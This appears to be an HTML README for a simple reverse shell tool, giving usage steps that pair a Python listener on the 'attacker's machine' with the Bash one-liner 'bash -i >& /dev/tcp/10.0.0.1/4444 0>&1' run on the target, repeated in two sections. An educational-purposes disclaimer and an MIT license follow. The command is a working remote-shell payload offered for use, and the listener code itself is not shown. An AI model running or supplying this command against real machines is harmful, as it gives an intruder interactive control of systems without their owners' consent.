<html>
 <head>
 
 </head>
 <body>
 <h1>Reverse Shell Tool</h1>
 <p>This is a simple reverse shell tool implemented in Bash and Python. It allows you to create a connection to a remote machine and start a Bash shell.</p>
 <h2>Bash Reverse Shell</h2>
 <p>The Bash reverse shell creates a connection to a remote machine and starts a Bash shell. The IP address and port number are specified in the code as hard-coded values.</p>
 <p>Here is an example of how to use the Bash reverse shell:</p>
 <ol>
 <li>Start the Python listener on the attacker's machine:</li>
 <code>python listener.py</code>
 <li>Run the Bash reverse shell on the target machine, specifying the IP address and port number of the attacker's machine:</li>
 <code>bash -i >& /dev/tcp/10.0.0.1/4444 0>&1</code>
 </ol>
 <h2>Python Listener</h2>
 <p>The Python listener waits for incoming connections from the Bash reverse shell and starts an interactive session with the remote machine.</p>
 <p>Here is an example of how to use the Python listener:</p>
 <ol>
 <li>Run the Python listener on the attacker's machine:</li>
 <code>python listener.py</code>
 <li>Run the Bash reverse shell on the target machine, specifying the IP address and port number of the attacker's machine:</li>
 <code>bash -i >& /dev/tcp/10.0.0.1/4444 0>&1</code>
 </ol>
 <h2>Disclaimer</h2>
 <p>This tool is intended for educational purposes only. Using it for illegal or unethical activities is strictly prohibited. The author is not responsible for any damage or harm caused by the use of this tool.</p>
 <h2>License</h2>
 <p>This tool is released under the MIT License. Feel free to use and modify it as you see fit.</p>
 <h2>Contact</h2>
 <p>If you have any questions or comments, feel free to contact me at <a href="mailto:johndoe@example.com">johndoe@example.com</a>.</p>
 </body>
</html>
